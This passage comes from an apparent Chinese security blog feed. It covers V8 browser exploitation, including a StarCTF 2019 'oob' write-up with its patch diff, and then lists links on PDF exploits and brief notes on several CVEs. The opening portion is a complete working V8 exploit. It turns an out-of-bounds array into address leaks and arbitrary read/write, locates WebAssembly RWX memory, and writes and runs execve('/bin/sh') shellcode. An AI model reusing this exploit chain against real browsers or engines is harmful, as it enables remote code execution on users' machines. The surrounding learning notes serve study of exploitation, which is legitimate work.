class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    convert int to float</span></span><br><span class="line"><span class="comment">    if nead convert a 64bits int to float</span></span><br><span class="line"><span class="comment">    please use string like "deadbeefdeadbeef"</span></span><br><span class="line"><span class="comment">    (v8's SMI just use 56bits, lowest 8bits is zero as flag)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> vall = hex(val);</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = vall.slice(<span class="number">10</span>, );</span><br><span class="line">        tmp[<span class="number">1</span>] = vall.slice(<span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">0</span>], <span class="number">16</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">1</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//convert number to hex string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> typeConvert();</span><br><span class="line"><span class="comment">// console.log(hex(0x12345678deadbeef));</span></span><br><span class="line"><span class="comment">// console.log(hex(dt.overturn('deadbeef')));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/</span></span><br><span class="line"><span class="keyword">var</span> bufArray = [];</span><br><span class="line"><span class="keyword">var</span> objArray = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">8224</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objGen</span>(<span class="params">tag</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.leak = <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">this</span>.tag = tag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">x</span> =&gt;</span> (</span><br><span class="line">    &#123;</span><br><span class="line">        counter : <span class="number">0</span>,</span><br><span class="line">        next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// for(let i=0;i&lt;=1000;i++)&#123;</span></span><br><span class="line">            bufArray.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>));</span><br><span class="line">            objArray.push(<span class="keyword">new</span> objGen(<span class="number">0xdead</span>));</span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------search a ArrayBuffer which could be controlled by oobArray-------*/</span></span><br><span class="line"><span class="keyword">var</span> offsetBuf; <span class="comment">//target offset of oobArray</span></span><br><span class="line"><span class="keyword">var</span> indexBuf;  <span class="comment">//target offset in bufArray</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x=<span class="number">0</span>; x&lt;=maxSize; x++) &#123;<span class="keyword">let</span> y = oobArray[x]&#125;; <span class="comment">//trigger the GC</span></span><br><span class="line"><span class="comment">//start search</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> val = dt.f2i(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0xbeef00000000</span>===val)&#123;</span><br><span class="line">        offsetBuf = i<span class="number">-3</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[*] target buf offset of oobArray: "</span> + offsetBuf);</span><br><span class="line">        <span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0xdead00000000</span>===val)&#123;</span><br><span class="line">        offsetObjLeak = i<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[*] target obj.leak offset of oobArray: "</span> + offsetObjLeak);</span><br><span class="line">        <span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>].leak = target;</span><br><span class="line">    <span class="keyword">return</span> dt.f2i(oobArray[offsetObjLeak]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test addressOf</span></span><br><span class="line"><span class="comment">// var testObj = &#123;a:'b'&#125;;</span></span><br><span class="line"><span class="comment">// %DebugPrint(testObj);</span></span><br><span class="line"><span class="comment">// console.log("leak test object : " + hex(addressOf(testObj)));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*---------------------arbitrary address read / write--------------------*/</span></span><br><span class="line"><span class="comment">// arbitrary address write</span></span><br><span class="line"><span class="keyword">var</span> dtView = <span class="keyword">new</span> <span class="built_in">DataView</span>(bufArray[<span class="number">0</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">    oobArray[offsetBuf+<span class="number">4</span>] = dt.i2f(addr);</span><br><span class="line">    dtView.setFloat64(<span class="number">0</span>, dt.i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// arbitrary address read</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr, str=false</span>)</span>&#123;</span><br><span class="line">    oobArray[offsetBuf+<span class="number">4</span>] = dt.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> tmp2 = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">''</span></span><br><span class="line">    tmp[<span class="number">1</span>] = hex(dtView.getUint32(<span class="number">0</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    tmp[<span class="number">0</span>] = hex(dtView.getUint32(<span class="number">4</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">        tmp2[<span class="number">0</span>] += tmp[<span class="number">0</span>].slice(i*<span class="number">2</span>, i*<span class="number">2</span>+<span class="number">2</span>);</span><br><span class="line">        tmp2[<span class="number">1</span>] += tmp[<span class="number">1</span>].slice(i*<span class="number">2</span>, i*<span class="number">2</span>+<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = tmp2[<span class="number">0</span>]+tmp2[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(str==<span class="literal">true</span>)&#123;<span class="keyword">return</span> <span class="string">'0x'</span>+result&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="built_in">parseInt</span>(result, <span class="number">16</span>)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// // test AAR/AAW</span></span><br><span class="line"><span class="comment">// leakAddr = dt.f2i(oobArray[1])-1;</span></span><br><span class="line"><span class="comment">// console.log("[*] leak a test addr : " + hex(leakAddr));</span></span><br><span class="line"><span class="comment">// write64(leakAddr, '12345678deadbeef');</span></span><br><span class="line"><span class="comment">// console.log("[*] read in leakAddr : " + read64(leakAddr, true));</span></span><br><span class="line"><span class="comment">// write64(leakAddr, 0xdeadbeef);</span></span><br><span class="line"><span class="comment">// console.log("[*] read in leakAddr : " + hex(read64(leakAddr)));</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*-------------------------use wasm to execute shellcode------------------*/</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = read64(addressFasm+<span class="number">0x18</span><span class="number">-0x1</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = read64(sharedInfo+<span class="number">0x8</span><span class="number">-0x1</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = (read64(codeAddr+<span class="number">0x70</span><span class="number">-0x1</span>)/<span class="number">0x10000</span>);</span><br><span class="line">memoryRWX = <span class="built_in">Math</span>.floor(memoryRWX);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] Get RWX memory : "</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="comment">//sys_execve('/bin/sh')</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="string">'2fbb485299583b6a'</span>,</span><br><span class="line">    <span class="string">'5368732f6e69622f'</span>,</span><br><span class="line">    <span class="string">'050f5e5457525f54'</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">//write shellcode into RWX memory</span></span><br><span class="line"><span class="keyword">var</span> offsetMem = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">of</span> shellcode) &#123;</span><br><span class="line">    write64(memoryRWX + offsetMem, x);</span><br><span class="line">    offsetMem += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//call funcAsm() and it would execute shellcode actually</span></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure><h2 id="StarCTF-2019-CTF-oob"><a href="#StarCTF-2019-CTF-oob" class="headerlink" title="StarCTF 2019 (*CTF) oob"></a>StarCTF 2019 (*CTF) oob</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个是出题给了一个array可以oob一个字节的洞，通过这个字节，我们可以修改对象的map属性，可以实现类型混淆/地址泄露。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT <span class="built_in">Object</span> GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    <span class="comment">/* 参数多于2即退出 */</span></span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);                       <span class="comment">//array即是this?</span></span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());         <span class="comment">//取数组对象的elements出来</span></span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;<span class="built_in">Number</span>());            <span class="comment">//数组长度</span></span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));      <span class="comment">//读下标length的元素出来</span></span><br><span class="line">+                                                                                   <span class="comment">//即越界读一个元素大小</span></span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;<span class="built_in">Object</span>&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, <span class="attr">Object</span>::ToNumber(isolate, args.at&lt;<span class="built_in">Object</span>&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.set(length,value-&gt;<span class="built_in">Number</span>());                                      <span class="comment">//往下标length处写入value</span></span><br><span class="line">+                                                                                   <span class="comment">//即越界写一个元素大小</span></span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><h3 id="传统利用"><a href="#传统利用" class="headerlink" title="传统利用"></a>传统利用</h3><p>传统利用就是泄露lib地址-&gt;hook某些函数-&gt;system/onegadget，在这里可以泄露d8加载地址。</p><p>一般是先选定一个地址，取低三位（即使开启地址随机化，低12位仍是恒定的偏移），只要从objaddr-0x8000开始循环读一个地址出来判断低12位，若符合我们选定地址的第三位，再读出地址里的内容，若目标地址内容为0x56415741e5894855，则可确定该地址即为d8装载空间中的地址，根据相对偏移即可确定d8装载基地址，再从got表中泄漏libc地址，即可完成内存泄漏。</p><p>但是这种看起来就不稳定，所以有以下方法，（妙，我好奇第一个发明出这种方法的人，是有多熟悉v8。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------------leak d8------------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> code   = read64(addressOf(floatArray.constructor) - <span class="number">0x1</span>n + <span class="number">0x30</span>n); <span class="comment">//constructor.code ptr</span></span><br><span class="line"><span class="keyword">var</span> d8Leak = read64(code - <span class="number">0x1</span>n + <span class="number">0x40</span>n) &gt;&gt; <span class="number">16</span>n; <span class="comment">//read addr from "mov r10, addr"</span></span><br><span class="line"><span class="keyword">var</span> d8Base = d8Leak - <span class="number">0xad54e0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] d8 base : "</span> + hex(d8Base));</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本就<code>数组越界 -&gt; 读写map指针 -&gt; 类型混淆 -&gt; 任意地址读写 -&gt; WASM执行Shellcode/劫持free_hook</code>。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感觉v8学起来还是比较容易的，但是不知道洞是怎么挖出来的，fuzz浏览器？像lokihardt那样康一眼函数名？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一阵好不容易把v8环境搓好了，要学习一波v8、浏览器漏洞。&lt;/p&gt;
&lt;h2 id=&quot;入门知识&quot;&gt;&lt;a href=&quot;#入门知识&quot; class=&quot;headerlink&quot; title=&quot;入门知识&quot;&gt;&lt;/a&gt;入门知识&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://m
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/CVE/v8/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>pdf相关漏洞分析</title>
    <link href="https://github.com/Cracke-S-J/2020/04/22/pdf%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/04/22/pdf%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-22T11:05:49.000Z</published>
    <updated>2020-04-22T14:59:50.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Windows内存管理与js相关堆利用"><a href="#Windows内存管理与js相关堆利用" class="headerlink" title="Windows内存管理与js相关堆利用"></a>Windows内存管理与js相关堆利用</h3><p>我可能要先补一下windows内存管理及相关js知识，之前较少了解过。</p><p><a href="https://asanzjx.github.io/2018/11/27/FromHeapSprayToHeapFengShui/" target="_blank" rel="noopener">从 HeapSpray( 堆喷射 ) 到 HeapFengShui( 堆风水 )</a></p><h3 id="PDF相关"><a href="#PDF相关" class="headerlink" title="PDF相关"></a>PDF相关</h3><p><a href="https://www.anquanke.com/post/id/87127" target="_blank" rel="noopener">PDF文件解析与PDF恶代分析中的一些坑</a></p><h2 id="PDF漏洞（CVE-2018-12794）浅析"><a href="#PDF漏洞（CVE-2018-12794）浅析" class="headerlink" title="PDF漏洞（CVE-2018-12794）浅析"></a>PDF漏洞（CVE-2018-12794）浅析</h2><p><a href="https://www.anquanke.com/post/id/177861" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177861</a></p><h2 id="深入分析Adobe忽略了6年的PDF漏洞"><a href="#深入分析Adobe忽略了6年的PDF漏洞" class="headerlink" title="深入分析Adobe忽略了6年的PDF漏洞"></a>深入分析Adobe忽略了6年的PDF漏洞</h2><p><a href="https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/</a></p><h2 id="CVE-2018-4990-Adobe-Reader代码执行漏洞利用分析"><a href="#CVE-2018-4990-Adobe-Reader代码执行漏洞利用分析" class="headerlink" title="CVE-2018-4990 Adobe Reader代码执行漏洞利用分析"></a>CVE-2018-4990 Adobe Reader代码执行漏洞利用分析</h2><p><a href="https://www.anquanke.com/post/id/145822" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145822</a></p><p><a href="https://www.freebuf.com/articles/system/173095.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173095.html</a></p><h2 id="Fuzz闭源的PDF阅读器"><a href="#Fuzz闭源的PDF阅读器" class="headerlink" title="Fuzz闭源的PDF阅读器"></a>Fuzz闭源的PDF阅读器</h2><p><a href="https://www.anquanke.com/post/id/183330" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183330</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;h3 id=&quot;Windows内存管理与js相关堆利用&quot;&gt;&lt;a href=&quot;#Windows内存管理与js相关堆利用&quot; class
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>日常整理过路 CVE</title>
    <link href="https://github.com/Cracke-S-J/2020/04/20/%E6%97%A5%E5%B8%B8%E6%95%B4%E7%90%86%E8%BF%87%E8%B7%AFCVE/"/>
    <id>https://github.com/Cracke-S-J/2020/04/20/%E6%97%A5%E5%B8%B8%E6%95%B4%E7%90%86%E8%BF%87%E8%B7%AFCVE/</id>
    <published>2020-04-20T11:49:10.000Z</published>
    <updated>2020-05-27T12:38:46.934Z</updated>
    
    <content type="html"><![CDATA[<p>过路CVE是指，日常逛一些论坛、博客看到的CVE，它们可能不是我的研究方向（我没有研究方向），但是就草率地看过去了就有点可惜聊。</p><h2 id="CVE-2020-3952：vCenter信息泄露漏洞分析"><a href="#CVE-2020-3952：vCenter信息泄露漏洞分析" class="headerlink" title="CVE-2020-3952：vCenter信息泄露漏洞分析"></a>CVE-2020-3952：vCenter信息泄露漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/203285" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203285</a></p><p>找洞过程是硬核diff两个版本，猛…基本就是权限控制有问题，一波操作猛如虎。</p><p><a href="https://github.com/guardicore/vmware_vcenter_cve_2020_3952/">POC</a></p><h2 id="天府杯2019：Adobe-Reader漏洞利用"><a href="#天府杯2019：Adobe-Reader漏洞利用" class="headerlink" title="天府杯2019：Adobe Reader漏洞利用"></a>天府杯2019：Adobe Reader漏洞利用</h2><p><a href="https://www.anquanke.com/post/id/202990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/202990</a></p><p>要多迷惑有多迷惑，不太懂js相关的堆操作，然后我发现我也不懂windows，也不懂pdf的解析。</p><p><a href="https://github.com/star-sg/CVE/tree/master/CVE-2019-16452">POC</a></p><h2 id="如何利用CodeQL挖掘CVE-2020-10199"><a href="#如何利用CodeQL挖掘CVE-2020-10199" class="headerlink" title="如何利用CodeQL挖掘CVE-2020-10199"></a>如何利用CodeQL挖掘CVE-2020-10199</h2><p><a href="https://www.anquanke.com/post/id/202987" target="_blank" rel="noopener">https://www.anquanke.com/post/id/202987</a></p><p>CodeQL都能挖出洞，我xvsa不能？？</p><p>看起来体验确实不错，xvsa哭泣。学到一招，是<a href="https://www.freebuf.com/vuls/197008.html" target="_blank" rel="noopener">表达式注入</a></p><p>改天想法成熟了用CodeQL挖一波洞，现在太弱鸡了，都不知道挖啥好。</p><h2 id="MySQL-JDBC-客户端反序列化漏洞分析"><a href="#MySQL-JDBC-客户端反序列化漏洞分析" class="headerlink" title="MySQL JDBC 客户端反序列化漏洞分析"></a>MySQL JDBC 客户端反序列化漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a></p><p>反正就，反序列化，就各种触发。</p><h2 id="半自动化挖掘-request-实现多种中间件回显"><a href="#半自动化挖掘-request-实现多种中间件回显" class="headerlink" title="半自动化挖掘 request 实现多种中间件回显"></a>半自动化挖掘 request 实现多种中间件回显</h2><p><a href="https://paper.seebug.org/1181/" target="_blank" rel="noopener">https://paper.seebug.org/1181/</a></p><p><a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><p>这个好用还是codeql好用呢，我看这个原理也比较简单，代码量也不大。</p><h2 id="二维码渗透"><a href="#二维码渗透" class="headerlink" title="二维码渗透"></a>二维码渗透</h2><p><a href="https://yiwlny.github.io/2019/05/15/%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">这里</a>，比较有意思。</p><h2 id="Ghidra-从-XXE-到-RCE"><a href="#Ghidra-从-XXE-到-RCE" class="headerlink" title="Ghidra 从 XXE 到 RCE"></a>Ghidra 从 XXE 到 RCE</h2><p><a href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/" target="_blank" rel="noopener">这个有意思</a>，万物皆可日，哪怕你是搞安全的。</p><h2 id="CVE-2020-8835-Linux-Kernel-信息泄漏-权限提升漏洞分析"><a href="#CVE-2020-8835-Linux-Kernel-信息泄漏-权限提升漏洞分析" class="headerlink" title="CVE-2020-8835 Linux Kernel 信息泄漏/权限提升漏洞分析"></a>CVE-2020-8835 Linux Kernel 信息泄漏/权限提升漏洞分析</h2><p><a href="https://paper.seebug.org/1185/" target="_blank" rel="noopener">https://paper.seebug.org/1185/</a></p><p>挺有意思的，不过它函数算寄存器范围算错了是怎么被发现了呢，fuzz？</p><h2 id="RowHammer"><a href="#RowHammer" class="headerlink" title="RowHammer"></a>RowHammer</h2><p>第一次听说这个，挺有意思。</p><p>Rowhammer是对动态随机存取存储器（DRAM）中会发生的一种意外情况的称呼。这种意外会导致存储器单元泄露电荷并可能造成比特翻转，这是由于现在DRAM单元的高密度造成的。一些高端芯片采用ECC(error-correcting code)技术来防止这个问题的发生。而一种称为ECCploit的攻击方法可以部分的绕过ECC保护机制。</p><p><a href="https://en.wikipedia.org/wiki/Row_hammer" target="_blank" rel="noopener">维基百科简介</a></p><p><a href="https://xlab.tencent.com/cn/2015/06/09/research-report-on-using-jit-to-trigger-rowhammer/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2015/06/09/research-report-on-using-jit-to-trigger-rowhammer/</a></p><h2 id="VirtualBox-USB-模块堆越界读写，或可造成虚拟机逃逸"><a href="#VirtualBox-USB-模块堆越界读写，或可造成虚拟机逃逸" class="headerlink" title="VirtualBox USB 模块堆越界读写，或可造成虚拟机逃逸"></a>VirtualBox USB 模块堆越界读写，或可造成虚拟机逃逸</h2><p>有趣，还没有POC。</p><p><a href="https://paper.seebug.org/1188/" target="_blank" 